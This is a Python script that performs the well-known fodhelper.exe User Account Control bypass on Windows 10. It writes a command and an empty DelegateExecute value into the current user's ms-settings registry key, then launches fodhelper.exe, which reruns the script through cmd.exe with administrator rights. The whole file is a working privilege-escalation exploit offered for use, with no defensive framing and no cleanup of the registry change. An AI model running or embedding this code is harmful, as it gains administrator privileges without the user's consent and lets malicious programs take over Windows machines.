#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
 __author__: Modified By Akash Panchal
 __date__: 14-Aug-2019
 __source__: https://dzone.com/articles/bypassing-windows-10-uac-withnbsppython
"""

import ctypes
import os
import sys
import winreg

CMD = r"C:\Windows\System32\cmd.exe"  # ANY EXE you want to trigger as Admin privileges

FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD = "start python"  # Execute Command Script with Admin privileges
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'


def is_running_as_admin():
    """
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    :return: 
    """

    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as err:
        return err


def create_reg_key(key, value):
    """
    Creates a reg key
    :param key: 
    :param value: 
    :return: 
    """
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise


def bypass_uac(cmd):
    """
    Tries to bypass the UAC
    :param cmd:
    :return:
    """
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        raise


def execute():
    if not is_running_as_admin():
        print('[INFO !] The script is NOT running with administrative privileges')
        print('[INFO +] Trying to bypass the UAC')
        try:
            current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            # cmd = '{} /k {}'.format(CMD, PYTHON_CMD) # When facing directory issues.
            bypass_uac(cmd)  # If you want trigger direct EXE file directly pass the EXE path here
            os.system(FOD_HELPER)
            sys.exit(0)
        except WindowsError:
            sys.exit(1)
    else:
        print('[INFO +] The script is running with administrative privileges!')


if __name__ == '__main__':
    execute()
